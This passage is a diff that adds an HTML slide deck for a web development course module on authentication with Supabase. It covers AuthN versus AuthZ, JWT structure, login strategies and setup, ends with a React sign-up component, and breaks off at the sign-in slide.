@@ -3,27 +3,1107 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Module 8 - Advanced Web Development">
-    <title>Module 8: Topic TBD | Advanced Web Development</title>
+    <meta name="description" content="Module 8 - Authentication &amp; Security: Protecting Your Web Applications with Supabase Auth">
+    <title>Module 8: Authentication &amp; Security | Advanced Web Development</title>
     <link rel="stylesheet" href="../css/slides.css">
+    <style>
+        /* Dark theme components — amber/red security accent */
+        .dark-container {
+            background: linear-gradient(135deg, #1a2332 0%, #2d3748 100%);
+            border-radius: 12px;
+            padding: 2rem;
+            border-left: 4px solid;
+            border-image: linear-gradient(180deg, #f59e0b, #ef4444, #8b5cf6) 1;
+        }
+        .dark-container h2 { color: #fff; margin: 0 0 0.5rem 0; font-size: 1.8rem; }
+        .dark-container .subtitle { color: #94a3b8; margin-bottom: 1.5rem; }
+        .dark-container h3 { color: #f59e0b; margin-top: 1rem; }
+        .dark-container ul { color: #94a3b8; }
+        .dark-container li { margin-bottom: 0.5rem; }
+        .dark-container strong { color: #fff; }
+        .dark-container p { color: #94a3b8; }
+        .dark-container code { background: #2d3a4d; color: #f59e0b; padding: 0.2rem 0.4rem; border-radius: 4px; }
+
+        .dark-two-column { display: grid; grid-template-columns: 1fr 1fr; gap: 2rem; }
+        .dark-three-column { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 1.5rem; }
+        .dark-four-column { display: grid; grid-template-columns: repeat(4, 1fr); gap: 1rem; }
+
+        .dark-card {
+            background: #2d3a4d;
+            border-radius: 8px;
+            padding: 1rem;
+            border-left: 3px solid #f59e0b;
+        }
+        .dark-card h4 { color: #fff; margin: 0 0 0.5rem 0; }
+        .dark-card p { color: #94a3b8; font-size: 0.9rem; margin: 0; }
+        .dark-card.warning { border-left-color: #facc15; }
+        .dark-card.danger { border-left-color: #f87171; }
+        .dark-card.info { border-left-color: #22d3ee; }
+
+        .dark-table { width: 100%; border-collapse: collapse; margin: 1rem 0; }
+        .dark-table th { background: #3d4a5d; color: #fff; padding: 0.75rem 1rem; text-align: left; }
+        .dark-table td { background: #2d3a4d; color: #94a3b8; padding: 0.75rem 1rem; border-bottom: 1px solid #3d4a5d; }
+        .dark-table code { background: #1a2332; color: #f59e0b; padding: 0.2rem 0.4rem; border-radius: 4px; }
+
+        .big-number { font-size: 4rem; font-weight: bold; color: #f59e0b; line-height: 1; }
+        .stat-label { color: #94a3b8; font-size: 1.1rem; margin-top: 0.5rem; }
+
+        .code-block { background: #1a2332; border-radius: 8px; padding: 1rem; overflow-x: auto; }
+        .code-block pre { margin: 0; color: #e2e8f0; font-family: 'Monaco', 'Menlo', monospace; font-size: 0.9rem; line-height: 1.5; }
+        .code-block .comment { color: #6b7280; }
+        .code-block .keyword { color: #c084fc; }
+        .code-block .string { color: #4ade80; }
+        .code-block .function { color: #60a5fa; }
+        .code-block .number { color: #f472b6; }
+        .code-block .tag { color: #f59e0b; }
+        .code-block .attr { color: #facc15; }
+
+        .feature-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 1rem; }
+        .feature-item { display: flex; align-items: flex-start; gap: 0.75rem; }
+        .feature-icon { color: #f59e0b; font-size: 1.25rem; }
+        .feature-text { color: #94a3b8; }
+        .feature-text strong { color: #fff; display: block; margin-bottom: 0.25rem; }
+
+        .step-number {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 2.5rem;
+            height: 2.5rem;
+            background: linear-gradient(135deg, #f59e0b, #ef4444);
+            color: #1a2332;
+            font-weight: bold;
+            font-size: 1.2rem;
+            border-radius: 50%;
+            margin-right: 1rem;
+            flex-shrink: 0;
+        }
+
+        .terminal-block {
+            background: #0d1117;
+            border-radius: 8px;
+            padding: 1rem;
+            font-family: 'Monaco', 'Menlo', monospace;
+            color: #c9d1d9;
+            margin: 1rem 0;
+        }
+        .terminal-block .prompt { color: #7ee787; }
+        .terminal-block .command { color: #fff; }
+        .terminal-block .output { color: #8b949e; }
+
+        /* Resource card styles */
+        .resource-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; margin-top: 1.5rem; }
+        .resource-card {
+            background: #2d3a4d;
+            border-radius: 12px;
+            padding: 1.5rem;
+            text-decoration: none;
+            transition: transform 0.2s, box-shadow 0.2s;
+            border: 1px solid #3d4a5d;
+        }
+        .resource-card:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
+        }
+        .resource-card h4 { color: #fff; margin: 0 0 0.5rem 0; }
+        .resource-card p { color: #94a3b8; margin: 0; font-size: 0.9rem; }
+        .resource-card .icon { font-size: 2rem; margin-bottom: 0.5rem; }
+
+        /* Flow diagram styles */
+        .flow-diagram {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            flex-wrap: wrap;
+            margin: 1.5rem 0;
+        }
+        .flow-step {
+            background: #2d3a4d;
+            border-radius: 8px;
+            padding: 0.75rem 1.25rem;
+            color: #fff;
+            font-size: 0.9rem;
+            text-align: center;
+            border: 1px solid #3d4a5d;
+        }
+        .flow-arrow { color: #f59e0b; font-size: 1.5rem; font-weight: bold; }
+
+        @media (max-width: 900px) {
+            .dark-two-column, .dark-three-column { grid-template-columns: 1fr; }
+            .dark-four-column { grid-template-columns: repeat(2, 1fr); }
+            .feature-grid { grid-template-columns: 1fr; }
+            .resource-grid { grid-template-columns: 1fr; }
+            .flow-diagram { flex-direction: column; }
+            .flow-arrow { transform: rotate(90deg); }
+        }
+    </style>
 </head>
 <body>
-    <div class="presentation">
-        <!-- Title Slide -->
-        <section class="slide title-slide">
+    <a href="#main-content" class="skip-link">Skip to main content</a>
+
+    <div class="presentation" id="main-content">
+
+        <!-- ========== Module Title ========== -->
+
+        <!-- Slide 1: Title -->
+        <section class="slide title-slide" data-narration="Welcome to Module 8, where we tackle one of the most critical topics in web development: authentication and security. Every real-world application needs to know who its users are and protect their data. In this module, we'll build on everything you learned about Supabase in Module 7 and add a complete authentication system to your applications. We'll cover how authentication works on the web, implement sign-up, sign-in, and sign-out flows using Supabase Auth, protect routes so only logged-in users can access certain content, and connect authentication to Row Level Security so users only see their own data. We'll also cover common web vulnerabilities you need to be aware of as a developer. By the end of this module, you'll have the skills to build secure, user-authenticated applications — a requirement for virtually every professional web project.">
             <h1>Module 8</h1>
-            <p class="subtitle">Topic TBD</p>
-            <p class="meta">Advanced Web Development</p>
+            <p class="subtitle">Authentication &amp; Security</p>
+            <p class="meta">Protecting Your Web Applications with Supabase Auth</p>
         </section>
 
-        <!-- Placeholder Content -->
-        <section class="slide">
-            <h1>Coming Soon</h1>
-            <p>Content for this module is being developed.</p>
-            <div class="info-box">
-                <p>Check back soon for updates to this module.</p>
+        <!-- Slide 2: Recommended Resources -->
+        <section class="slide" id="resources" data-narration="Before we dive into authentication, here are some essential resources you'll want to bookmark. The Supabase Auth documentation is your primary reference — it covers every auth method, has code examples for React, and stays up to date with the latest API changes. The OWASP Top 10 is the industry-standard list of the most critical web application security risks, published by the Open Web Application Security Project. Every developer should be familiar with it. These aren't just supplemental reading — the Supabase docs will be especially useful when you're implementing auth in your assignment. I'd recommend having the Supabase Auth docs open in a tab while you work through this module.">
+            <div class="dark-container">
+                <h2>Recommended Resources</h2>
+                <p class="subtitle">Essential references for authentication and web security.</p>
+                <div class="resource-grid">
+                    <a href="https://supabase.com/docs/guides/auth" target="_blank" rel="noopener" class="resource-card">
+                        <div class="icon">🔐</div>
+                        <h4>Supabase Auth Docs</h4>
+                        <p>Official documentation for Supabase Authentication — covers email, OAuth, magic links, and more</p>
+                    </a>
+                    <a href="https://owasp.org/www-project-top-ten/" target="_blank" rel="noopener" class="resource-card">
+                        <div class="icon">🛡️</div>
+                        <h4>OWASP Top 10</h4>
+                        <p>The standard awareness document for web application security — the 10 most critical risks</p>
+                    </a>
+                </div>
             </div>
         </section>
+
+        <!-- ========== PART 1: Authentication Fundamentals ========== -->
+
+        <!-- Slide 3: Part 1 Title -->
+        <section class="slide title-slide" id="part1" data-narration="Part 1 covers the fundamentals of authentication — what it is, why it matters, and how it works on the web. Before we write a single line of auth code, you need to understand the underlying concepts. We'll talk about the difference between authentication and authorization, how sessions and tokens work, what a JWT is, and the different strategies for authenticating users. These concepts apply regardless of what auth provider you use — whether it's Supabase, Firebase, Auth0, or a custom solution. Understanding the fundamentals means you won't just be copying code; you'll actually know what's happening under the hood. Let's start with the basics.">
+            <h1>Part 1</h1>
+            <p class="subtitle">Authentication Fundamentals</p>
+        </section>
+
+        <!-- Slide 4: Why Authentication Matters -->
+        <section class="slide" id="why-auth-matters" data-narration="Let's start with the most basic question: why does authentication matter? First and most importantly, it protects user data. When someone creates an account on your app, they're trusting you with their information — their email, their content, potentially their payment details. Without authentication, anyone could access anyone else's data. Second, authentication enables personalization. Think about how Netflix shows you different recommendations than your roommate, or how your email inbox only shows your emails. That's authentication at work. Third, authentication is the foundation for authorization — controlling who can do what. A regular user can edit their own profile, but only an admin can delete other users' accounts. You can't enforce those rules if you don't know who the user is in the first place. In 2024, users expect authentication. An app without it feels unfinished and untrustworthy.">
+            <div class="dark-container">
+                <h2>Why Authentication Matters</h2>
+                <p class="subtitle">Authentication is the foundation of trust in web applications.</p>
+                <div class="dark-three-column" style="margin-top: 1.5rem;">
+                    <div class="dark-card">
+                        <h4>🔒 Protect User Data</h4>
+                        <p>Users trust you with their information. Authentication ensures only they can access it.</p>
+                    </div>
+                    <div class="dark-card">
+                        <h4>👤 Enable Personalization</h4>
+                        <p>Show each user their own content — their todos, their settings, their preferences.</p>
+                    </div>
+                    <div class="dark-card">
+                        <h4>🛡️ Foundation for Authorization</h4>
+                        <p>You can't control who does what if you don't know who they are first.</p>
+                    </div>
+                </div>
+                <div class="dark-card danger" style="margin-top: 1.5rem;">
+                    <h4>Without Auth, Your App Is a Shared Notebook</h4>
+                    <p>Anyone can read, write, or delete anything. That's fine for a demo — unacceptable for production.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Slide 5: Authentication vs Authorization -->
+        <section class="slide" id="authn-vs-authz" data-narration="This is a distinction that trips up a lot of developers, so let's get it straight. Authentication — often abbreviated AuthN — answers the question 'Who are you?' It's the process of verifying someone's identity. Think of it like showing your driver's license at a bar. The bouncer checks your ID to confirm you are who you claim to be. Authorization — abbreviated AuthZ — answers 'What are you allowed to do?' It's about permissions. Think of it like a keycard at an office building. Your keycard might let you into the main floor, but not the server room or the executive suite. You need authentication before authorization can happen. The system has to know who you are before it can decide what you're allowed to do. In our Supabase apps, Supabase Auth handles authentication — verifying identity. Row Level Security handles authorization — controlling what data each authenticated user can access. These are separate concerns, and understanding that distinction will make your security architecture much cleaner.">
+            <div class="dark-container">
+                <h2>Authentication vs Authorization</h2>
+                <p class="subtitle">Two different questions your app needs to answer.</p>
+                <div class="dark-two-column" style="margin-top: 1.5rem;">
+                    <div class="dark-card" style="border-left-color: #f59e0b;">
+                        <h4>🪪 Authentication (AuthN)</h4>
+                        <p style="font-size: 1rem; margin-bottom: 0.5rem;"><strong>"Who are you?"</strong></p>
+                        <p>Verifying identity — proving you are who you claim to be.</p>
+                        <p style="margin-top: 0.5rem;"><strong>Analogy:</strong> Showing your ID at the door</p>
+                        <p style="margin-top: 0.5rem;"><strong>Example:</strong> Logging in with email &amp; password</p>
+                    </div>
+                    <div class="dark-card" style="border-left-color: #8b5cf6;">
+                        <h4>🔑 Authorization (AuthZ)</h4>
+                        <p style="font-size: 1rem; margin-bottom: 0.5rem;"><strong>"What can you do?"</strong></p>
+                        <p>Controlling permissions — what actions and data you can access.</p>
+                        <p style="margin-top: 0.5rem;"><strong>Analogy:</strong> Your keycard opens some doors, not all</p>
+                        <p style="margin-top: 0.5rem;"><strong>Example:</strong> Users edit their own todos, not others'</p>
+                    </div>
+                </div>
+                <div class="dark-card info" style="margin-top: 1.5rem;">
+                    <h4>AuthN comes first → then AuthZ</h4>
+                    <p>Supabase Auth handles authentication. Row Level Security (RLS) handles authorization.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Slide 6: How Auth Works on the Web -->
+        <section class="slide" id="how-auth-works" data-narration="Let's talk about how authentication actually works on the web at a high level. When you log into a website, the server needs some way to remember that you're logged in across multiple requests. HTTP is stateless — every request is independent. So the server creates a session or issues a token to identify you. There are three main approaches. Session-based auth is the traditional model: you log in, the server creates a session and stores it, then sends a session ID as a cookie. Every subsequent request includes that cookie so the server knows it's you. Token-based auth — which is what Supabase uses — works differently. After you log in, the server gives you a JSON Web Token. Your browser stores it and sends it with every request. The server verifies the token cryptographically without needing to look anything up in a database. Cookies are the transport mechanism — they're how the browser automatically sends credentials with every request. Modern auth systems like Supabase typically use token-based auth stored in cookies. The key takeaway is that all of these approaches solve the same problem: remembering who you are between requests.">
+            <div class="dark-container">
+                <h2>How Auth Works on the Web</h2>
+                <p class="subtitle">HTTP is stateless — auth systems add identity to each request.</p>
+                <div class="dark-three-column" style="margin-top: 1.5rem;">
+                    <div class="dark-card">
+                        <h4>🍪 Cookies</h4>
+                        <p>Small pieces of data the browser automatically sends with every request to a domain. The transport mechanism for auth.</p>
+                    </div>
+                    <div class="dark-card">
+                        <h4>📋 Sessions</h4>
+                        <p>Server stores your login state, gives you a session ID in a cookie. Traditional approach — server keeps track.</p>
+                    </div>
+                    <div class="dark-card">
+                        <h4>🎫 Tokens (JWTs)</h4>
+                        <p>Server gives you a signed token after login. You send it with requests. Server verifies the signature — no database lookup needed.</p>
+                    </div>
+                </div>
+                <div class="dark-card info" style="margin-top: 1.5rem;">
+                    <h4>Supabase Uses Token-Based Auth</h4>
+                    <p>After login, Supabase returns a JWT that your app stores and sends with API requests. This is the modern standard.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Slide 7: JWTs Explained -->
+        <section class="slide" id="jwts-explained" data-narration="Since Supabase uses JWTs, let's understand what they actually are. A JSON Web Token — or JWT, pronounced 'jot' — is a compact, URL-safe way to represent claims between two parties. A JWT has three parts separated by dots. The header specifies the algorithm used to sign the token, usually HS256 or RS256. The payload contains the actual data — called claims — like the user's ID, email, and when the token expires. The signature is created by taking the header and payload, combining them, and signing them with a secret key that only the server knows. Here's the critical thing: the header and payload are just Base64 encoded, not encrypted. Anyone can decode and read them. The signature just ensures they haven't been tampered with. That means you should never put sensitive data like passwords or credit card numbers in a JWT. The user ID and email? Fine. A social security number? Absolutely not. When your app sends a JWT to Supabase, Supabase verifies the signature to make sure the token is legitimate and hasn't expired. That's how it knows which user is making the request.">
+            <div class="dark-container">
+                <h2>JWTs Explained</h2>
+                <p class="subtitle">JSON Web Tokens — the modern standard for stateless authentication.</p>
+                <div class="dark-three-column" style="margin-top: 1.5rem;">
+                    <div class="dark-card" style="border-left-color: #ef4444;">
+                        <h4>Header</h4>
+                        <div class="code-block" style="margin-top: 0.5rem;">
+<pre>{
+  <span class="string">"alg"</span>: <span class="string">"HS256"</span>,
+  <span class="string">"typ"</span>: <span class="string">"JWT"</span>
+}</pre>
+                        </div>
+                        <p style="margin-top: 0.5rem;">Algorithm &amp; token type</p>
+                    </div>
+                    <div class="dark-card" style="border-left-color: #f59e0b;">
+                        <h4>Payload</h4>
+                        <div class="code-block" style="margin-top: 0.5rem;">
+<pre>{
+  <span class="string">"sub"</span>: <span class="string">"user-uuid"</span>,
+  <span class="string">"email"</span>: <span class="string">"a@b.com"</span>,
+  <span class="string">"exp"</span>: <span class="number">1717200000</span>
+}</pre>
+                        </div>
+                        <p style="margin-top: 0.5rem;">User data (claims)</p>
+                    </div>
+                    <div class="dark-card" style="border-left-color: #8b5cf6;">
+                        <h4>Signature</h4>
+                        <div class="code-block" style="margin-top: 0.5rem;">
+<pre>HMACSHA256(
+  base64(header) + "." +
+  base64(payload),
+  secret
+)</pre>
+                        </div>
+                        <p style="margin-top: 0.5rem;">Tamper-proof verification</p>
+                    </div>
+                </div>
+                <div class="dark-card danger" style="margin-top: 1.5rem;">
+                    <h4>⚠️ JWTs Are Encoded, NOT Encrypted</h4>
+                    <p>Anyone can read the payload. Never store secrets, passwords, or sensitive data in a JWT. The signature only prevents tampering.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Slide 8: Auth Strategies -->
+        <section class="slide" id="auth-strategies" data-narration="There are several ways to authenticate users, and each has trade-offs. Email and password is the most traditional approach — users create an account with their email and a password. It's familiar to everyone, but you take on the responsibility of handling passwords securely. OAuth, or social login, lets users sign in with an existing account like Google, GitHub, or Apple. It's convenient because users don't need another password, and you don't need to store passwords at all. The downside is you're dependent on third-party providers. Magic links are a passwordless approach — the user enters their email, receives a link, and clicking it logs them in. No password to remember or steal. However, it requires email access and adds friction since users have to switch to their inbox. Passkeys are the newest approach, using biometrics or device PINs for authentication. They're the most secure option but browser support is still growing. The good news is Supabase supports all of these. For this module, we'll focus on email/password and OAuth with GitHub, since those are the most common patterns you'll encounter in the real world.">
+            <div class="dark-container">
+                <h2>Auth Strategies</h2>
+                <p class="subtitle">Different ways to verify user identity — each with trade-offs.</p>
+                <table class="dark-table">
+                    <tr>
+                        <th>Strategy</th>
+                        <th>How It Works</th>
+                        <th>Pros</th>
+                        <th>Cons</th>
+                    </tr>
+                    <tr>
+                        <td><strong style="color: #fff;">Email &amp; Password</strong></td>
+                        <td>User creates account with email + password</td>
+                        <td>Familiar, user controls credentials</td>
+                        <td>You handle password security</td>
+                    </tr>
+                    <tr>
+                        <td><strong style="color: #fff;">OAuth / Social</strong></td>
+                        <td>Sign in with Google, GitHub, Apple, etc.</td>
+                        <td>No passwords to store, convenient</td>
+                        <td>Dependent on third parties</td>
+                    </tr>
+                    <tr>
+                        <td><strong style="color: #fff;">Magic Links</strong></td>
+                        <td>Email a login link — click to authenticate</td>
+                        <td>Passwordless, nothing to steal</td>
+                        <td>Requires email access, slower</td>
+                    </tr>
+                    <tr>
+                        <td><strong style="color: #fff;">Passkeys</strong></td>
+                        <td>Biometrics or device PIN (WebAuthn)</td>
+                        <td>Most secure, phishing-resistant</td>
+                        <td>Newer, browser support growing</td>
+                    </tr>
+                </table>
+                <div class="dark-card info" style="margin-top: 1rem;">
+                    <h4>Supabase Supports All of These</h4>
+                    <p>We'll focus on email/password and OAuth (GitHub) — the most common patterns in production apps.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Slide 9: What is Supabase Auth? -->
+        <section class="slide" id="what-is-supabase-auth" data-narration="Supabase Auth is the built-in authentication system that comes with every Supabase project. You've already been using Supabase for your database in Module 7 — now we're going to use it for authentication too. That's one of the biggest advantages of Supabase: it's an all-in-one platform. You don't need to set up a separate auth service like Auth0 or Firebase Auth. It's already there, ready to go, in the same project where your database lives. Supabase Auth supports email and password sign-up, OAuth providers like Google, GitHub, and Apple, magic link emails, and even phone-based OTP. On the free tier, you get up to 50,000 monthly active users, which is more than enough for any class project or even a small production app. Under the hood, Supabase Auth uses the GoTrue server, an open-source auth API. It handles password hashing, token generation, email verification, and session management. You just call the JavaScript methods and Supabase handles the rest. The real magic is how auth integrates with your database through Row Level Security — but we'll get to that in Part 2.">
+            <div class="dark-container">
+                <h2>What is Supabase Auth?</h2>
+                <p class="subtitle">Built-in authentication for every Supabase project — no extra setup needed.</p>
+                <div class="dark-two-column" style="margin-top: 1.5rem;">
+                    <div>
+                        <div class="dark-card" style="margin-bottom: 1rem;">
+                            <h4>🔌 Built-In</h4>
+                            <p>Already included in your Supabase project from Module 7. No extra services to configure.</p>
+                        </div>
+                        <div class="dark-card" style="margin-bottom: 1rem;">
+                            <h4>📧 Multiple Providers</h4>
+                            <p>Email/password, Google, GitHub, Apple, magic links, phone OTP — all supported.</p>
+                        </div>
+                        <div class="dark-card">
+                            <h4>💰 Generous Free Tier</h4>
+                            <p>50,000 monthly active users on the free plan. More than enough for class projects.</p>
+                        </div>
+                    </div>
+                    <div>
+                        <div class="dark-card" style="margin-bottom: 1rem;">
+                            <h4>🔑 Handles the Hard Stuff</h4>
+                            <p>Password hashing, JWT generation, email verification, session refresh — all automatic.</p>
+                        </div>
+                        <div class="dark-card" style="margin-bottom: 1rem;">
+                            <h4>🛡️ RLS Integration</h4>
+                            <p>Auth connects directly to Row Level Security — users only see their own data.</p>
+                        </div>
+                        <div class="dark-card">
+                            <h4>📖 Open Source</h4>
+                            <p>Built on GoTrue — an open-source auth server. No vendor lock-in.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Slide 10: Setting Up Supabase Auth -->
+        <section class="slide" id="setup-supabase-auth" data-narration="Setting up Supabase Auth for your project is straightforward because you've already done most of the work in Module 7. You already have a Supabase project, the supabase-js client installed, and your environment variables configured. For email and password authentication, the email provider is enabled by default in every new Supabase project. You can verify this by going to your Supabase dashboard, clicking Authentication in the sidebar, then Providers. You should see Email listed and enabled. One important setting to check: under Authentication, then URL Configuration, you'll see your Site URL and Redirect URLs. For local development, make sure your site URL is set to http://localhost:5173, which is Vite's default. When you deploy to Vercel, you'll add your production URL there too. If you want to disable email confirmation for development — which makes testing easier — go to Authentication, then Email Templates, and you can toggle 'Confirm email' off in the Provider settings. Just remember to turn it back on before going to production. That's really it for setup. Supabase makes this remarkably painless.">
+            <div class="dark-container">
+                <h2>Setting Up Supabase Auth</h2>
+                <p class="subtitle">Your Supabase project from Module 7 already has auth ready — just verify the settings.</p>
+                <div class="feature-grid" style="margin-top: 1.5rem;">
+                    <div class="feature-item">
+                        <span class="step-number">1</span>
+                        <div class="feature-text">
+                            <strong>Verify Email Provider</strong>
+                            Dashboard → Authentication → Providers → Email should be enabled (it's on by default)
+                        </div>
+                    </div>
+                    <div class="feature-item">
+                        <span class="step-number">2</span>
+                        <div class="feature-text">
+                            <strong>Set Redirect URLs</strong>
+                            Authentication → URL Configuration → Add <code>http://localhost:5173</code> for local dev
+                        </div>
+                    </div>
+                    <div class="feature-item">
+                        <span class="step-number">3</span>
+                        <div class="feature-text">
+                            <strong>Optional: Disable Email Confirm</strong>
+                            For dev only — Authentication → Providers → Email → toggle off "Confirm email"
+                        </div>
+                    </div>
+                    <div class="feature-item">
+                        <span class="step-number">4</span>
+                        <div class="feature-text">
+                            <strong>Supabase Client (already done)</strong>
+                            Your <code>supabaseClient.js</code> from Module 7 already connects to your project
+                        </div>
+                    </div>
+                </div>
+                <div class="dark-card warning" style="margin-top: 1.5rem;">
+                    <h4>⚠️ Don't Forget Production URLs</h4>
+                    <p>When you deploy to Vercel, add your <code>https://your-app.vercel.app</code> URL to the redirect URLs list. Auth won't work without it.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Slide 11: Auth Flow Diagram -->
+        <section class="slide" id="auth-flow" data-narration="Let's walk through the complete authentication flow so you understand what happens at each step. When a user fills out your sign-up form and clicks Submit, your React app calls supabase.auth.signUp with their email and password. Supabase receives the request, hashes the password using bcrypt — so the plain text password is never stored — and creates a new row in the auth.users table in your database. Supabase then generates a JWT containing the user's ID and sends it back to your app along with the user object. Your Supabase client automatically stores this session — the JWT and refresh token — in the browser's local storage. From that point on, every request your app makes to Supabase automatically includes the JWT in the Authorization header. Supabase verifies the token signature, extracts the user ID, and uses it to enforce Row Level Security policies. When the token expires — typically after one hour — the client automatically uses the refresh token to get a new one, so the user stays logged in. This whole process happens transparently once you set it up. You call signUp or signIn, and the client handles the rest.">
+            <div class="dark-container">
+                <h2>The Auth Flow</h2>
+                <p class="subtitle">What happens when a user signs up or signs in with Supabase.</p>
+                <div class="flow-diagram">
+                    <div class="flow-step">👤 User submits<br>sign-up form</div>
+                    <span class="flow-arrow">→</span>
+                    <div class="flow-step">📡 App calls<br><code>supabase.auth.signUp()</code></div>
+                    <span class="flow-arrow">→</span>
+                    <div class="flow-step">🔒 Supabase hashes password<br>&amp; creates user</div>
+                    <span class="flow-arrow">→</span>
+                    <div class="flow-step">🎫 Returns JWT<br>+ user object</div>
+                    <span class="flow-arrow">→</span>
+                    <div class="flow-step">💾 Client stores<br>session automatically</div>
+                </div>
+                <div class="dark-two-column" style="margin-top: 1.5rem;">
+                    <div class="dark-card">
+                        <h4>After Login</h4>
+                        <p>Every Supabase request automatically includes the JWT. RLS policies use it to filter data per user.</p>
+                    </div>
+                    <div class="dark-card">
+                        <h4>Token Refresh</h4>
+                        <p>JWTs expire after ~1 hour. The client automatically refreshes them using a refresh token — users stay logged in.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Slide 12: Part 1 Summary -->
+        <section class="slide" id="part1-summary" data-narration="Let's recap Part 1. Authentication verifies who a user is, while authorization controls what they can do — these are separate concerns. On the web, auth works through cookies, sessions, or tokens — Supabase uses JWT-based tokens. JWTs have three parts: header, payload, and signature. They're encoded, not encrypted, so never put secrets in them. There are multiple auth strategies: email and password, OAuth, magic links, and passkeys — each with trade-offs. Supabase Auth is built into your existing Supabase project and handles the hard parts like password hashing and token management. The auth flow is straightforward: user submits credentials, Supabase verifies them, returns a JWT, and your client stores it automatically. With these fundamentals in place, we're ready to actually implement authentication in React. That's what Part 2 is all about — writing the actual code.">
+            <div class="dark-container">
+                <h2>Part 1 Summary</h2>
+                <p class="subtitle">Key concepts from Authentication Fundamentals.</p>
+                <div class="feature-grid" style="margin-top: 1.5rem;">
+                    <div class="feature-item">
+                        <span class="feature-icon">✓</span>
+                        <div class="feature-text">
+                            <strong>AuthN vs AuthZ</strong>
+                            Authentication = who you are. Authorization = what you can do. Separate concerns.
+                        </div>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">✓</span>
+                        <div class="feature-text">
+                            <strong>JWTs</strong>
+                            Header + Payload + Signature. Encoded, not encrypted. Don't store secrets.
+                        </div>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">✓</span>
+                        <div class="feature-text">
+                            <strong>Auth Strategies</strong>
+                            Email/password, OAuth, magic links, passkeys — all supported by Supabase.
+                        </div>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">✓</span>
+                        <div class="feature-text">
+                            <strong>Supabase Auth</strong>
+                            Built-in, handles password hashing, JWT generation, and session management.
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ========== PART 2: Building Auth with Supabase ========== -->
+
+        <!-- Slide 13: Part 2 Title -->
+        <section class="slide title-slide" id="part2" data-narration="Part 2 is where we get hands-on. We're going to implement a complete authentication system in React using Supabase Auth. We'll start with the individual auth operations — sign up, sign in, sign out, and getting the current user. Then we'll build a complete login form component with proper error handling and loading states. After that, we'll cover protected routes, OAuth with GitHub, and connecting auth to Row Level Security. Finally, we'll wrap up with a section on web security basics — common vulnerabilities and best practices every developer needs to know. By the end of Part 2, you'll have all the pieces you need for the assignment. Let's write some code.">
+            <h1>Part 2</h1>
+            <p class="subtitle">Building Auth with Supabase</p>
+        </section>
+
+        <!-- Slide 14: Sign Up with Email -->
+        <section class="slide" id="sign-up" data-narration="Let's start with the most basic auth operation: signing up a new user. The supabase.auth.signUp method takes an object with email and password. It's an async operation, so you'll use async/await. The method returns an object with data and error properties. If the sign-up succeeds, data contains a user object and a session object. If it fails — maybe the email is already taken or the password is too weak — the error object will have a message explaining what went wrong. This example shows a complete React component with a form, state management for the email and password inputs, error handling, and loading state. Notice we're calling e.preventDefault() on the form submit to prevent the page from refreshing. We're also disabling the button while the request is in flight to prevent double-submissions. The password minimum in Supabase is 6 characters by default. Always show users meaningful error messages — don't just fail silently.">
+            <div class="dark-container">
+                <h2>Sign Up with Email</h2>
+                <p class="subtitle">Create a new user account with <code>supabase.auth.signUp()</code></p>
+                <div class="code-block">
+<pre><span class="keyword">import</span> { useState } <span class="keyword">from</span> <span class="string">'react'</span>;
+<span class="keyword">import</span> { supabase } <span class="keyword">from</span> <span class="string">'./supabaseClient'</span>;
+
+<span class="keyword">function</span> <span class="function">SignUp</span>() {
+  <span class="keyword">const</span> [email, setEmail] = <span class="function">useState</span>(<span class="string">''</span>);
+  <span class="keyword">const</span> [password, setPassword] = <span class="function">useState</span>(<span class="string">''</span>);
+  <span class="keyword">const</span> [loading, setLoading] = <span class="function">useState</span>(<span class="keyword">false</span>);
+  <span class="keyword">const</span> [error, setError] = <span class="function">useState</span>(<span class="keyword">null</span>);
+
+  <span class="keyword">const</span> <span class="function">handleSignUp</span> = <span class="keyword">async</span> (e) => {
+    e.<span class="function">preventDefault</span>();
+    <span class="function">setLoading</span>(<span class="keyword">true</span>);
+    <span class="function">setError</span>(<span class="keyword">null</span>);
+
+    <span class="keyword">const</span> { data, error } = <span class="keyword">await</span> supabase.auth.<span class="function">signUp</span>({
+      email,
+      password,
+    });
+
+    <span class="keyword">if</span> (error) <span class="function">setError</span>(error.message);
+    <span class="keyword">else</span> <span class="function">alert</span>(<span class="string">'Check your email for a confirmation link!'</span>);
+    <span class="function">setLoading</span>(<span class="keyword">false</span>);
+  };
+
+  <span class="comment">// ... form JSX (see Login Form slide)</span>
+}</pre>
+                </div>
+            </div>
+        </section>
+
+        <!-- Slide 15: Sign In with Email -->
+        <section class="slide" id="sign-in" data-narration="Signing in an existing user looks almost identical to sign-up, but you use signInWithPassword instead of signUp. Notice the method name is very explicit — signInWithPassword — because Supabase supports multiple sign-in methods and they each have their own function. The response structure is the same: you get data and error back. On success, data.session contains the JWT and refresh token, and data.user contains the user's profile information. The Supabase client automatically stores the session, so after this call succeeds, all subsequent Supabase queries will be authenticated. One common mistake students make: don't use signUp when you mean signIn. If someone already has an account and tries to sign up again with the same email, they'll get an error or a confusing response. Your UI should clearly separate the sign-up and sign-in flows, even if the forms look similar. We'll build a nice toggling form component in a few slides.">
+            <div class="dark-container">
+                <h2>Sign In with Email</h2>
+                <p class="subtitle">Authenticate an existing user with <code>supabase.auth.signInWithPassword()</code></p>
+                <div class="code-block">
